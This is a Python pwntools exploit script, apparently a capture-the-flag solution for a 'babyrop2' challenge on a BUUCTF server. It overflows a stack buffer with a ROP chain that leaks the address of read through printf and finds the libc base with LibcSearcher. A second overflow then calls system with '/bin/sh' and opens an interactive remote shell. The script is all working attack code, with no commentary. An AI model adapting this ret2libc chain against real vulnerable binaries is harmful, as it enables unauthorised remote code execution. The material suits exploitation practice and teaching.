from pwn import *
from LibcSearcher import *
context(os='linux',log_level='debug')
io = remote('node3.buuoj.cn',29291)
elf = ELF('./babyrop2')
#libc = ELF('')
printf_plt=elf.plt['printf']
read_got = elf.got['read']
frame_adr = 0x400770
rdi = 0x400733
rsi = 0x400731
main = 0x400636
payload = cyclic(0x20+8)+p64(rdi)+p64(frame_adr)+p64(rsi)+p64(read_got)+p64(0xdeadbeef)+p64(printf_plt)+p64(main)

io.recvuntil('name?')
io.sendline(payload)
read_adr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(read_adr)

obj = LibcSearcher("read", 0x7faa7a90d250)
base = read_adr-obj.dump('read')
system = base+obj.dump('system')
str_bin_sh = base+obj.dump('str_bin_sh')
payload = cyclic(0x20+8)+p64(rdi)+p64(str_bin_sh)+p64(system)
io.sendline(payload)
io.interactive()


